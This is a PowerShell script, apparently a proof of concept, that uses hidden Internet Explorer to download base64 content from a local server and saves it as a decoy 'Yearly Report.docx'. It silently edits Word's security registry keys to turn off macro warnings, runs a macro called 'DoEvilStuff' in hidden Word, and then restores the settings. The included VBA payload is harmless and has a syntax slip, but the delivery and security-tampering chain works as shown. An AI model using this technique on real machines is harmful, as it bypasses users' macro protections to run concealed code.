
#Download file with IE
$ie = New-Object -ComObject "InternetExplorer.Application"
$uri = "http://127.0.0.1:8000/base64_docx.html"
$ie.Visible = $false;
$ie.navigate($uri)
while ($ie.Busy) {Start-Sleep -Milliseconds 100 }
$data = $ie.Document.getElementsByTagName('body')[0].innerText

$ie.Quit()
[System.Runtime.InteropServices.Marshal]::ReleaseComObject( $ie )

$filename = "%USERPROFILE%/Documents/Yearly Report.docx"
[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data))

#Prepare word
$word = new-object -comobject word.application
$app = $word.Application
$app.visible = $false

#Enable macros
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name AccessVBOM -PropertyType DWORD  -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name VBAWarnings -PropertyType DWORD  -Value 1 -Force | Out-Null

#Open word document
$Document=$Word.documents.open($filename)

#Run macros
$app.run("DoEvilStuff")

#Disable macros
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name AccessVBOM -PropertyType DWORD  -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name VBAWarnings -PropertyType DWORD  -Value 0 -Force | Out-Null

<# 
Macro code for Word
Sub DoEvilStuff()

  Dim Path As String
  Dim FileNumber As Integer
  Path = environ("USERPROFILE") & \Desktop\Hello.txt"
  FileNumber = FreeFile
  Open Path For Output As FileNumber
  Print #FileNumber, "HaXxXed"
  Close FileNumber

End Sub
#>